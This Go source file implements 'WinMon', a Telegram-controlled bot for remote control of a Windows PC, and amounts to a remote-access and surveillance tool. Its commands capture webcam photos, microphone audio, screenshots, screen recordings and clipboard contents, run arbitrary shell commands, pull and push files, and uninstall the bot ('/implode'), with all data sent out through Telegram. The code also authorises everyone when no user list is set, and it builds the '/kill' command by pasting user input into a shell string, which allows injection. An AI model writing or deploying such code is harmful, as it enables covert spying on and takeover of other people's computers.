package bot

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"

	"winmon/internal/audio"
	"winmon/internal/clipboard"
	"winmon/internal/config"
	"winmon/internal/device"
	"winmon/internal/display"
	"winmon/internal/files"
	"winmon/internal/input"
	"winmon/internal/media"
	"winmon/internal/notifications"
	"winmon/internal/service"
	"winmon/internal/shell"
)

type BotCoordinator struct {
	cfg      *config.Config
	bot      *tgbotapi.BotAPI
	stopChan chan struct{}
}

func NewBotCoordinator(cfg *config.Config, stopChan chan struct{}) *BotCoordinator {
	return &BotCoordinator{
		cfg:      cfg,
		stopChan: stopChan,
	}
}

func (b *BotCoordinator) Start() {
	bot, err := tgbotapi.NewBotAPI(b.cfg.BotToken)
	if err != nil {
		log.Fatalf("Failed to create Telegram bot session: %v", err)
	}
	b.bot = bot

	log.Printf("🟢 WinMon Telegram Bot connected successfully as @%s (Device: %s)",
		bot.Self.UserName, b.cfg.DeviceName)

	// Register Bot Commands with Telegram
	b.registerCommands()

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 30

	updates := bot.GetUpdatesChan(u)

	for {
		select {
		case <-b.stopChan:
			log.Println("Stopping WinMon Telegram Bot...")
			bot.StopReceivingUpdates()
			return
		case update, ok := <-updates:
			if !ok {
				return
			}
			go b.handleUpdate(update)
		}
	}
}

func (b *BotCoordinator) isAuthorized(userID int64, username string) bool {
	if len(b.cfg.AllowedUsers) == 0 {
		return true
	}
	idStr := strconv.FormatInt(userID, 10)
	for _, allowed := range b.cfg.AllowedUsers {
		allowedClean := strings.TrimSpace(allowed)
		if allowedClean == idStr || (username != "" && strings.EqualFold(allowedClean, username)) {
			return true
		}
	}
	return false
}

func (b *BotCoordinator) registerCommands() {
	commands := []tgbotapi.BotCommand{
		{Command: "start", Description: "Show interactive control panel"},
		{Command: "help", Description: "Show available commands & control panel"},
		{Command: "screenshot", Description: "Capture primary display screenshot"},
		{Command: "webcam", Description: "Capture photo from active webcam"},
		{Command: "screenrecord", Description: "Record screen activity as GIF (e.g. /screenrecord 5)"},
		{Command: "listen", Description: "Record microphone audio as voice note (e.g. /listen 5)"},
		{Command: "cmd", Description: "Execute shell command (e.g. /cmd ipconfig)"},
		{Command: "sysinfo", Description: "Display hardware metrics & system info"},
		{Command: "processes", Description: "List running processes"},
		{Command: "kill", Description: "Kill process by PID or name (e.g. /kill 1234)"},
		{Command: "download", Description: "Download file from PC (e.g. /download C:\\file.txt)"},
		{Command: "upload", Description: "Upload file to PC (send attachment with /upload destination)"},
		{Command: "clipboard", Description: "Get or set PC clipboard (e.g. /clipboard text)"},
		{Command: "brightness", Description: "Set display brightness (e.g. /brightness 80)"},
		{Command: "volume", Description: "Set or toggle master audio (e.g. /volume 50 | mute | unmute)"},
		{Command: "lock", Description: "Lock Windows workstation"},
		{Command: "notify", Description: "Show toast notification (e.g. /notify Title | Message)"},
		{Command: "setwallpaper", Description: "Set wallpaper from photo attachment"},
	}

	cfg := tgbotapi.NewSetMyCommands(commands...)
	if _, err := b.bot.Request(cfg); err != nil {
		log.Printf("Warning: Failed to register Telegram bot commands: %v", err)
	}
}

func getDashboardKeyboard() tgbotapi.InlineKeyboardMarkup {
	return tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("📸 Screenshot", "btn_screenshot"),
			tgbotapi.NewInlineKeyboardButtonData("📹 Webcam", "btn_webcam"),
			tgbotapi.NewInlineKeyboardButtonData("🎙 Mic (5s)", "btn_listen"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("📊 SysInfo", "btn_sysinfo"),
			tgbotapi.NewInlineKeyboardButtonData("⚙️ Processes", "btn_processes"),
			tgbotapi.NewInlineKeyboardButtonData("📋 Clipboard", "btn_clipboard"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🔒 Lock PC", "btn_lock"),
			tgbotapi.NewInlineKeyboardButtonData("🔇 Mute/Unmute", "btn_mute"),
			tgbotapi.NewInlineKeyboardButtonData("🔉 Vol -10", "btn_voldown"),
			tgbotapi.NewInlineKeyboardButtonData("🔊 Vol +10", "btn_volup"),
		),
	)
}

func (b *BotCoordinator) handleUpdate(update tgbotapi.Update) {
	if update.CallbackQuery != nil {
		b.handleCallbackQuery(update.CallbackQuery)
		return
	}

	if update.Message == nil {
		return
	}

	msg := update.Message
	userID := msg.From.ID
	username := msg.From.UserName
	chatID := msg.Chat.ID

	if !b.isAuthorized(userID, username) {
		log.Printf("Unauthorized Telegram access attempt from UserID: %d (@%s)", userID, username)
		b.sendText(chatID, fmt.Sprintf("🔴 **Access Denied**: User ID `%d` is not authorized to control device `%s`.", userID, b.cfg.DeviceName))
		return
	}

	// Handle attachments (Uploads / Wallpapers)
	if msg.Photo != nil || msg.Document != nil {
		caption := strings.TrimSpace(msg.Caption)
		if strings.HasPrefix(caption, "/setwallpaper") {
			b.handleSetWallpaperAttachment(msg)
			return
		}
		if strings.HasPrefix(caption, "/upload") {
			dest := strings.TrimSpace(strings.TrimPrefix(caption, "/upload"))
			b.handleAttachmentUpload(msg, dest)
			return
		}
		if msg.Document != nil {
			b.handleAttachmentUpload(msg, "")
			return
		}
	}

	text := strings.TrimSpace(msg.Text)
	if text == "" {
		return
	}

	fields := strings.Fields(text)
	cmd := strings.ToLower(fields[0])
	if idx := strings.Index(cmd, "@"); idx != -1 {
		cmd = cmd[:idx]
	}
	args := fields[1:]

	b.processCommand(cmd, args, chatID)
}

func (b *BotCoordinator) handleCallbackQuery(cb *tgbotapi.CallbackQuery) {
	userID := cb.From.ID
	username := cb.From.UserName
	chatID := cb.Message.Chat.ID

	callback := tgbotapi.NewCallback(cb.ID, "")
	_, _ = b.bot.Request(callback)

	if !b.isAuthorized(userID, username) {
		b.sendText(chatID, fmt.Sprintf("🔴 **Access Denied**: User ID `%d` is not authorized.", userID))
		return
	}

	switch cb.Data {
	case "btn_screenshot":
		b.executeCommandLocallyOrIPC("/screenshot", nil, chatID)
	case "btn_webcam":
		b.executeCommandLocallyOrIPC("/webcam", nil, chatID)
	case "btn_listen":
		b.executeCommandLocallyOrIPC("/listen", []string{"5"}, chatID)
	case "btn_sysinfo":
		b.processCommand("/sysinfo", nil, chatID)
	case "btn_processes":
		b.processCommand("/processes", nil, chatID)
	case "btn_clipboard":
		b.executeCommandLocallyOrIPC("/clipboard", nil, chatID)
	case "btn_lock":
		_ = input.TriggerHotkey("win+l")
		b.sendText(chatID, "🔒 PC Workstation Locked.")
	case "btn_mute":
		_ = audio.SetMute(true)
		b.sendText(chatID, "🔇 Audio Muted.")
	case "btn_voldown":
		_ = audio.SetVolume(30)
		b.sendText(chatID, "🔉 Volume set to **30%**.")
	case "btn_volup":
		_ = audio.SetVolume(80)
		b.sendText(chatID, "🔊 Volume set to **80%**.")
	}
}

func (b *BotCoordinator) processCommand(cmd string, args []string, chatID int64) {
	switch cmd {
	case "/start", "/help":
		welcome := fmt.Sprintf("⚡ **WinMon Remote Control Panel**\n"+
			"**Device:** `%s`\n"+
			"**Group:** `%s` | **Version:** `%s`\n\n"+
			"Select a quick action below or type `/` to see all available commands.",
			b.cfg.DeviceName, b.cfg.Group, b.cfg.Version)
		b.sendTextWithKeyboard(chatID, welcome, getDashboardKeyboard())

	case "/screenshot", "/webcam", "/screenrecord", "/listen", "/clipboard":
		b.executeCommandLocallyOrIPC(cmd, args, chatID)

	case "/sysinfo", "/deviceinfo":
		b.executeNativeTelegram("/sysinfo", args, chatID, time.Now())

	case "/processes", "/kill", "/cmd", "/download", "/volume", "/brightness", "/lock", "/notify", "/setwallpaper":
		b.executeNativeTelegram(cmd, args, chatID, time.Now())

	case "/restartservice":
		b.sendText(chatID, "🔄 Restarting WinMon service...")
		if service.IsRunningAsService() {
			_ = service.StartService("WinMon")
		}

	case "/shutdownservice":
		b.sendText(chatID, "🛑 Stopping WinMon service/process...")
		if service.IsRunningAsService() {
			_ = service.StopService("WinMon")
		} else {
			go func() {
				time.Sleep(1 * time.Second)
				os.Exit(0)
			}()
		}

	case "/implode":
		b.sendText(chatID, "💥 Uninstalling WinMon service and self-destructing...")
		if service.IsRunningAsService() {
			_ = service.UninstallService("WinMon")
		}
		go func() {
			time.Sleep(2 * time.Second)
			os.Exit(0)
		}()

	default:
		b.sendText(chatID, fmt.Sprintf("❓ Unknown command: `%s`. Type `/help` for available commands.", cmd))
	}
}

func (b *BotCoordinator) executeCommandLocallyOrIPC(cmd string, args []string, chatID int64) {
	start := time.Now()
	flatArgs := strings.Join(args, " ")

	if service.IsRunningAsService() {
		// Route via Session 1 IPC Agent
		resp, err := service.SendIPCCommand(service.IPCRequest{
			Cmd:      cmd,
			Args:     args,
			FlatArgs: flatArgs,
		}, 60*time.Second)
		if err != nil {
			b.sendText(chatID, fmt.Sprintf("🔴 Session Agent IPC Error: %v", err))
			return
		}
		if !resp.Success {
			b.sendText(chatID, fmt.Sprintf("🔴 IPC Command Error: %s", resp.Error))
			return
		}
		b.handleHelperOutputTelegram(cmd, chatID, start)
		return
	}

	// Console mode / Local service execution
	err := RunSessionHelper(cmd, flatArgs)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("🔴 Command Error: %v", err))
		return
	}
	b.handleHelperOutputTelegram(cmd, chatID, start)
}

func (b *BotCoordinator) executeNativeTelegram(cmd string, args []string, chatID int64, start time.Time) {
	dur := fmt.Sprintf("(%d ms)", time.Since(start).Milliseconds())

	switch cmd {
	case "/sysinfo", "/deviceinfo":
		info, err := device.GetDeviceInfo(b.cfg.DeviceName, b.cfg.DeviceID, b.cfg.Version)
		if err != nil {
			b.sendText(chatID, fmt.Sprintf("🔴 Error getting sysinfo: %v", err))
			return
		}
		msg := fmt.Sprintf("🖥️ **WinMon System Metrics** %s\n```\n%s\n```", dur, info)
		b.sendTextWithKeyboard(chatID, msg, getDashboardKeyboard())

	case "/processes":
		procs, err := shell.ExecuteCommand("tasklist", 10*time.Second)
		if err != nil {
			b.sendText(chatID, fmt.Sprintf("🔴 Error fetching processes: %v", err))
			return
		}
		if len(procs) > 3800 {
			procs = procs[:3800] + "\n... [truncated]"
		}
		b.sendText(chatID, fmt.Sprintf("📋 **Running Processes:** %s\n```\n%s\n```", dur, procs))

	case "/kill":
		if len(args) < 1 {
			b.sendText(chatID, "Usage: `/kill <PID or ProcessName>`")
			return
		}
		killCmd := fmt.Sprintf("taskkill /F /PID %s || taskkill /F /IM %s", args[0], args[0])
		out, err := shell.ExecuteCommand(killCmd, 10*time.Second)
		if err != nil {
			b.sendText(chatID, fmt.Sprintf("🔴 Process kill output:\n```\n%s\nError: %v\n```", out, err))
		} else {
			b.sendText(chatID, fmt.Sprintf("🟢 Process `%s` terminated successfully:\n```\n%s\n```", args[0], out))
		}

	case "/cmd":
		if len(args) < 1 {
			b.sendText(chatID, "Usage: `/cmd <command>`")
			return
		}
		execStr := strings.Join(args, " ")
		out, err := shell.ExecuteCommand(execStr, 25*time.Second)
		if len(out) > 3800 {
			out = out[:3800] + "\n... [truncated]"
		}
		if err != nil {
			b.sendText(chatID, fmt.Sprintf("🔴 **Command Execution Error:**\n```\n%s\nError: %v\n```", out, err))
		} else {
			b.sendText(chatID, fmt.Sprintf("🟢 **Command Output:** %s\n```\n%s\n```", dur, out))
		}

	case "/download":
		if len(args) < 1 {
			b.sendText(chatID, "Usage: `/download <filepath>`")
			return
		}
		filePath := strings.Join(args, " ")
		b.sendFile(chatID, filePath, fmt.Sprintf("📥 Downloaded from `%s`:", b.cfg.DeviceName))

	case "/volume":
		if len(args) < 1 {
			b.sendText(chatID, "Usage: `/volume <0-100 | mute | unmute>`")
			return
		}
		arg := strings.ToLower(args[0])
		if arg == "mute" {
			_ = audio.SetMute(true)
			b.sendText(chatID, "🔇 Audio Muted.")
		} else if arg == "unmute" {
			_ = audio.SetMute(false)
			b.sendText(chatID, "🔊 Audio Unmuted.")
		} else {
			vol, err := strconv.Atoi(arg)
			if err != nil {
				b.sendText(chatID, "Volume must be an integer between 0 and 100.")
				return
			}
			err = audio.SetVolume(vol)
			if err != nil {
				b.sendText(chatID, fmt.Sprintf("🔴 Failed to set volume: %v", err))
			} else {
				b.sendText(chatID, fmt.Sprintf("🔊 Volume set to **%d%%**.", vol))
			}
		}

	case "/brightness":
		if len(args) < 1 {
			b.sendText(chatID, "Usage: `/brightness <0-100>`")
			return
		}
		bri, err := strconv.Atoi(args[0])
		if err != nil {
			b.sendText(chatID, "Brightness must be an integer (0-100).")
			return
		}
		if service.IsRunningAsService() {
			b.executeCommandLocallyOrIPC("/brightness", []string{args[0]}, chatID)
		} else {
			err = display.SetBrightness(bri)
			if err != nil {
				b.sendText(chatID, fmt.Sprintf("🔴 Brightness error: %v", err))
			} else {
				b.sendText(chatID, fmt.Sprintf("🔆 Brightness set to **%d%%**.", bri))
			}
		}

	case "/lock":
		_ = input.TriggerHotkey("win+l")
		b.sendText(chatID, "🔒 Workstation Locked.")

	case "/notify":
		if len(args) < 1 {
			b.sendText(chatID, "Usage: `/notify <title> | <message>`")
			return
		}
		fullText := strings.Join(args, " ")
		if service.IsRunningAsService() {
			b.executeCommandLocallyOrIPC("/notify", []string{fullText}, chatID)
		} else {
			parts := strings.Split(fullText, "|")
			title := "WinMon Notification"
			msg := fullText
			if len(parts) > 1 {
				title = strings.TrimSpace(parts[0])
				msg = strings.TrimSpace(parts[1])
			}
			err := notifications.ShowToastLocal(title, msg)
			if err != nil {
				b.sendText(chatID, fmt.Sprintf("🔴 Notification error: %v", err))
			} else {
				b.sendText(chatID, "🔔 Notification displayed on PC screen.")
			}
		}
	}
}

func (b *BotCoordinator) handleHelperOutputTelegram(cmd string, chatID int64, start time.Time) {
	dur := fmt.Sprintf("(%d ms)", time.Since(start).Milliseconds())

	switch cmd {
	case "/screenshot":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
		if _, err := os.Stat(tempPath); err == nil {
			b.sendPhoto(chatID, tempPath, "📸 **Desktop Screenshot** "+dur)
			os.Remove(tempPath)
		} else {
			b.sendText(chatID, "🔴 Failed to retrieve screenshot from session agent.")
		}
	case "/webcam":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
		if _, err := os.Stat(tempPath); err == nil {
			b.sendPhoto(chatID, tempPath, "📹 **Webcam Photo** "+dur)
			os.Remove(tempPath)
		} else {
			b.sendText(chatID, "🔴 Failed to retrieve webcam photo from session agent.")
		}
	case "/screenrecord":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
		if _, err := os.Stat(tempPath); err == nil {
			b.sendAnimation(chatID, tempPath, "🎥 **Screen Recording GIF** "+dur)
			os.Remove(tempPath)
		} else {
			b.sendText(chatID, "🔴 Failed to retrieve screen recording from session agent.")
		}
	case "/listen":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
		if _, err := os.Stat(tempPath); err == nil {
			b.sendVoice(chatID, tempPath, "🎙️ **Microphone Audio Voice Note** "+dur)
			os.Remove(tempPath)
		} else {
			b.sendText(chatID, "🔴 Failed to retrieve audio recording from session agent.")
		}
	case "/clipboard":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
		if data, err := os.ReadFile(tempPath); err == nil {
			b.sendText(chatID, fmt.Sprintf("📋 **Clipboard Content:**\n```\n%s\n```", string(data)))
			os.Remove(tempPath)
		} else {
			b.sendText(chatID, "🔴 Failed to read clipboard from session agent.")
		}
	default:
		b.sendText(chatID, fmt.Sprintf("🟢 Command `%s` executed successfully %s.", cmd, dur))
	}
}

func (b *BotCoordinator) sendText(chatID int64, text string) {
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = tgbotapi.ModeMarkdown
	_, _ = b.bot.Send(msg)
}

func (b *BotCoordinator) sendTextWithKeyboard(chatID int64, text string, keyboard tgbotapi.InlineKeyboardMarkup) {
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = tgbotapi.ModeMarkdown
	msg.ReplyMarkup = keyboard
	_, _ = b.bot.Send(msg)
}

func (b *BotCoordinator) sendPhoto(chatID int64, filePath string, caption string) {
	photo := tgbotapi.NewPhoto(chatID, tgbotapi.FilePath(filePath))
	photo.Caption = caption
	photo.ParseMode = tgbotapi.ModeMarkdown
	_, err := b.bot.Send(photo)
	if err != nil {
		log.Printf("Error sending photo to Telegram: %v", err)
	}
}

func (b *BotCoordinator) sendVoice(chatID int64, filePath string, caption string) {
	voice := tgbotapi.NewVoice(chatID, tgbotapi.FilePath(filePath))
	voice.Caption = caption
	voice.ParseMode = tgbotapi.ModeMarkdown
	_, err := b.bot.Send(voice)
	if err != nil {
		log.Printf("Error sending voice note to Telegram: %v", err)
	}
}

func (b *BotCoordinator) sendAnimation(chatID int64, filePath string, caption string) {
	anim := tgbotapi.NewAnimation(chatID, tgbotapi.FilePath(filePath))
	anim.Caption = caption
	anim.ParseMode = tgbotapi.ModeMarkdown
	_, err := b.bot.Send(anim)
	if err != nil {
		log.Printf("Error sending animation to Telegram: %v", err)
	}
}

func (b *BotCoordinator) sendFile(chatID int64, filePath string, caption string) {
	doc := tgbotapi.NewDocument(chatID, tgbotapi.FilePath(filePath))
	doc.Caption = caption
	doc.ParseMode = tgbotapi.ModeMarkdown
	_, err := b.bot.Send(doc)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("🔴 Error sending file `%s`: %v", filePath, err))
	}
}

func (b *BotCoordinator) handleAttachmentUpload(msg *tgbotapi.Message, destination string) {
	chatID := msg.Chat.ID
	var fileID string
	var fileName string

	if msg.Document != nil {
		fileID = msg.Document.FileID
		fileName = msg.Document.FileName
	} else if msg.Photo != nil && len(msg.Photo) > 0 {
		bestPhoto := msg.Photo[len(msg.Photo)-1]
		fileID = bestPhoto.FileID
		fileName = fmt.Sprintf("photo_%d.jpg", time.Now().Unix())
	}

	if fileID == "" {
		b.sendText(chatID, "🔴 No valid attachment found to download.")
		return
	}

	fileURL, err := b.bot.GetFileDirectURL(fileID)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("🔴 Failed to resolve Telegram file URL: %v", err))
		return
	}

	finalPath, err := files.PrepareUploadPath(destination, fileName)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("🔴 Invalid upload destination: %v", err))
		return
	}

	resp, err := http.Get(fileURL)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("🔴 Failed to download file stream: %v", err))
		return
	}
	defer resp.Body.Close()

	out, err := os.Create(finalPath)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("🔴 Failed to create target file: %v", err))
		return
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("🔴 Failed to save file contents: %v", err))
		return
	}

	b.sendText(chatID, fmt.Sprintf("🟢 File uploaded successfully to `%s`", finalPath))
}

func (b *BotCoordinator) handleSetWallpaperAttachment(msg *tgbotapi.Message) {
	chatID := msg.Chat.ID
	tempPath := filepath.Join(service.GetSharedTempDir(), "winmon_wall_temp.jpg")
	b.handleAttachmentUpload(msg, tempPath)
	b.executeCommandLocallyOrIPC("/setwallpaper", []string{tempPath}, chatID)
	_ = os.Remove(tempPath)
}

// Session helper commands (executed inside user desktop session)
func RunSessionHelper(cmd string, args string) error {
	switch cmd {
	case "/screenshot":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
		return media.CaptureScreen(tempPath)
	case "/webcam":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
		return media.CaptureWebcam(tempPath)
	case "/screenrecord":
		dur := parseDuration(args)
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
		return media.RecordScreen(dur, tempPath)
	case "/listen":
		dur := parseDuration(args)
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
		return media.RecordAudio(dur, tempPath)
	case "/setwallpaper":
		return display.SetWallpaperLocal(args)
	case "/notify":
		parts := strings.Split(args, "|")
		title := "WinMon Notification"
		msg := args
		if len(parts) > 1 {
			title = strings.TrimSpace(parts[0])
			msg = strings.TrimSpace(parts[1])
		}
		return notifications.ShowToastLocal(title, msg)
	case "/clipboard":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
		txt, err := clipboard.GetClipboardLocal()
		if err != nil {
			return err
		}
		return os.WriteFile(tempPath, []byte(txt), 0644)
	case "/setclipboard":
		return clipboard.SetClipboardLocal(args)
	case "/brightness":
		bri, err := strconv.Atoi(args)
		if err != nil {
			return fmt.Errorf("brightness must be an integer: %w", err)
		}
		return display.SetBrightness(bri)
	}

	return fmt.Errorf("unsupported helper command: %s", cmd)
}

func parseDuration(arg string) time.Duration {
	d, err := strconv.Atoi(strings.TrimSpace(arg))
	if err != nil || d <= 0 {
		return 5 * time.Second
	}
	return time.Duration(d) * time.Second
}

// RunSessionAgentLoop runs the persistent IPC listener in Session 1
func RunSessionAgentLoop() error {
	log.Println("Starting WinMon Persistent Session Agent (Session 1 IPC Listener)...")
	return service.StartIPCAgentServer(func(req service.IPCRequest) service.IPCResponse {
		err := RunSessionHelper(req.Cmd, req.FlatArgs)
		if err != nil {
			return service.IPCResponse{
				Success: false,
				Error:   err.Error(),
			}
		}
		return service.IPCResponse{
			Success: true,
		}
	})
}
